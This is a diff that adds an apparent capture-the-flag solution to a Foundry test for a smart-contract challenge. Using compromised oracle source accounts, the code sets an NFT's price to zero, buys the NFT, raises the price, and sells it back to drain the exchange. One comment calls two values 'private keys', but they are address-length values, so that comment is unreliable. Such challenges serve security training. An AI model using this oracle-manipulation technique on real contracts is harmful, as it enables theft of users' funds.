@@ -75,7 +75,46 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
+        /*
+            The readme file contains two private keys that correspond to the trusted sources.
+            The way to decode them was to convert int from hex to string(base64) and then base64 to string.
+            The private keys are:
+            1. 0x188Ea627E3531Db590e6f1D71ED83628d1933088
+            2. 0xA417D473c40a4d42BAd35f147c21eEa7973539D8
+
+            The attack vector is to buy a nft from the exchange with low price and then sell it back to the exchange with a high price.
+            To drain the exchange of all its eth, we can use the oracle to manipulate the price of the nft.
+            We can do it since we have control over the trusted sources.
+        */
+        // We have control over sources[0] and sources[1]
+        // We can manipulate the price of the nft
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", 0);
+
+        // Buy the nft from the exchange, since the price is 0, we can buy it with 1 wei (it will be refunded)
+        vm.prank(player);
+        exchange.buyOne{value: 1 wei}();
         
+        // change the price of the nft to a high value that drains the exchange of all its eth
+        // 999 ether + 0.1 ether = 999.1 ether
+        vm.prank(sources[0]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(sources[1]);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        // Sell the nft back to the exchange
+        vm.startPrank(player);
+        // we need to first approve the exchange to transfer the nft
+        nft.approve(address(exchange), 0);
+        exchange.sellOne(0);
+
+        // transfer the eth from the exchange to the recovery account
+        recovery.call{value: INITIAL_NFT_PRICE}("");
+
+        vm.stopPrank();
+
     }
 
     /**
